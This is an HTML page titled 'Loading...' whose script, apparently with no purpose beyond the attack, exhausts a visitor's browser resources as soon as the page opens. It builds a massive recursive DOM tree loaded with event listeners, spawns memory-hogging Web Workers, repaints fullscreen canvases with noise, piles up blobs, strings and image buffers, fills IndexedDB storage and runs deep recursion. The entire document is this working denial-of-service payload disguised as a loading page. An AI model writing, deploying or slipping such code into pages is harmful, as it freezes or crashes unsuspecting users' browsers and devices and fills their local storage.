<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
        #status { position: fixed; top: 10px; left: 10px; z-index: 9999; font-size: 12px; }
    </style>
</head>
<body>
    <div id="status">Initializing...</div>
    <div id="container"></div>
    <script>
        const status = document.getElementById('status');
        const container = document.getElementById('container');
        let memoryUsage = 0;
        
        // DOM bomb - deeper tree, more nodes
        function buildTree(parent, level, maxLevel = 20) {
            if (level > maxLevel) return;
            for (let i = 0; i < 12; i++) {
                const div = document.createElement('div');
                div.innerHTML = `<span>L${level}N${i}</span>`.repeat(50);
                
                // Heavy event listener spam
                for (let j = 0; j < 200; j++) {
                    div.addEventListener('mousemove', () => {
                        let s = '';
                        for (let k = 0; k < 500; k++) {
                            s += Math.random().toString(36);
                        }
                    });
                    div.addEventListener('mouseover', () => {
                        for (let k = 0; k < 1000; k++) {
                            void new Array(1000).fill(0);
                        }
                    });
                }
                parent.appendChild(div);
                buildTree(div, level + 1, maxLevel);
            }
        }
        
        status.textContent = 'Building DOM tree...';
        buildTree(container, 0, 20);
        status.textContent = 'DOM built. Spawning workers...';
        
        // Web Workers - separate memory contexts
        for (let w = 0; w < 8; w++) {
            const workerCode = `
                let store = [];
                setInterval(() => {
                    for (let i = 0; i < 100; i++) {
                        store.push(new ArrayBuffer(10485760)); // 10MB per push
                    }
                    if (store.length > 1000) store.splice(0, 100);
                }, 100);
            `;
            const blob = new Blob([workerCode], { type: 'application/javascript' });
            const url = URL.createObjectURL(blob);
            try {
                new Worker(url);
            } catch (e) {}
        }
        
        // Canvas - fullscreen, high-res pixel spam
        const canvases = [];
        for (let c = 0; c < 4; c++) {
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            canvas.style.position = 'fixed';
            canvas.style.top = '0';
            canvas.style.left = '0';
            canvas.style.zIndex = -1;
            document.body.appendChild(canvas);
            canvases.push(canvas);
            
            const ctx = canvas.getContext('2d');
            setInterval(() => {
                const idata = ctx.createImageData(canvas.width, canvas.height);
                const data = idata.data;
                for (let i = 0; i < data.length; i++) {
                    data[i] = Math.random() * 255;
                }
                ctx.putImageData(idata, 0, 0);
            }, 16);
        }
        
        // Blob factory - aggressive accumulation
        let blobStore = [];
        setInterval(() => {
            for (let i = 0; i < 50; i++) {
                const size = 5 * 1024 * 1024; // 5MB per blob
                blobStore.push(new Blob([new ArrayBuffer(size)]));
            }
            if (blobStore.length > 3000) {
                blobStore.splice(0, 300);
            }
            
            memoryUsage += 250; // 50 blobs * 5MB
            if (performance.memory) {
                status.textContent = `Memory: ${(performance.memory.usedJSHeapSize / 1073741824).toFixed(2)}GB | Blobs: ${blobStore.length}`;
            }
        }, 500);
        
        // String accumulation - fragmentation engine
        let stringStore = '';
        setInterval(() => {
            for (let i = 0; i < 1000; i++) {
                stringStore += 'X'.repeat(10000);
            }
            if (stringStore.length > 1000000000) {
                stringStore = stringStore.slice(500000000);
            }
        }, 200);
        
        // IndexedDB fallback (if Blob isn't enough)
        if (window.indexedDB) {
            const dbReq = indexedDB.open('memoryLeakDB', 1);
            dbReq.onupgradeneeded = (e) => {
                const db = e.target.result;
                db.createObjectStore('data');
            };
            dbReq.onsuccess = (e) => {
                const db = e.target.result;
                const tx = db.transaction('data', 'readwrite');
                const store = tx.objectStore('data');
                setInterval(() => {
                    for (let i = 0; i < 100; i++) {
                        store.add({
                            data: new ArrayBuffer(1024 * 1024) // 1MB each
                        }, 'key_' + Math.random());
                    }
                }, 300);
            };
        }
        
        // Recursive function stack depth
        function recursiveBomb(depth) {
            if (depth < 10000) {
                let arr = new Array(1000).fill(Math.random());
                recursiveBomb(depth + 1);
            }
        }
        
        setInterval(() => {
            try {
                recursiveBomb(0);
            } catch (e) {}
        }, 1000);
        
        // Image data accumulation
        let imgStore = [];
        setInterval(() => {
            for (let i = 0; i < 5; i++) {
                imgStore.push(ctx.createImageData(1920, 1080));
            }
            if (imgStore.length > 500) imgStore.splice(0, 50);
        }, 100);
    </script>
</body>
</html>
